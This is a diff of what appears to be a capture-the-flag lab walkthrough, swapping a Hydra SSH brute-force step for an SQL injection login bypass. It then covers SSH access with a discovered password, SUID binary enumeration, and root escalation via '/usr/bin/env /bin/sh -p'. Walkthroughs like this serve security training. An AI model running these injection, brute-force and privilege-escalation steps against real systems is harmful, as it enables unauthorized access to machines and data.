@@ -17,24 +17,70 @@ PORT   STATE SERVICE REASON
 
 ```
 
-## Examining the Web Page and Its Infrastructure
+## Examining the Web Page
 We access the web page hosted on the Apache server and find this:
 
 ![Descripción de Injection](Imagenes/Injection_1.png)
 
-
-
-
 ## Intrusion
 
-Finally, everything points to the need for a brute force attack on the SSH service with the username "borazuwarah" and a password dictionary.
+We can gain access with a simple SQL injection attack:
 
-For this, I'm going to use the Hydra tool
 
 ```ruby
-hydra -l borazuwarah -P rockyou.txt -t 10 -w 1 ssh://172.0.17.2
+Login: admin' or 1=1 -- - 
+Password: admin
 ```
 
-![Descripción de Borazu](Imagenes/Borazu_4.png)
+Successfully, we access the login panel:
+![Descripción de Injection](Imagenes/Injection_2.png)
 
-Hydra obtains the password for that given user, so we can now connect to the SSH service.
+
+We observe one user and possibly a password that we can try with the SSH service.
+
+```ruby
+ssh dylan@172.17.0.2 
+```
+
+We try the password KJSDFG789FGSDF78:
+
+We successfully gain access!
+
+## Privilege Escalation
+
+For privilege escalation, we need to identify which files we can execute with root privileges.
+
+To find these files, we need to execute this command:
+
+```ruby
+sudo -l
+```
+We notice that we can't execute this command because it doesn't exist. So, we can search for binaries with SUID permissions using this command:
+
+```ruby
+find / -perm -4000 -user root 2>/dev/null
+```
+
+we obtain this results:
+
+```ruby
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/env
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/chfn
+```
+
+If we examine the different results, we find a binary file named "env". We can execute this command to potentially gain root privileges:
+
+```ruby
+/usr/bin/env /bin/sh -p
+```
+
+Finally, we gain access as the root user.
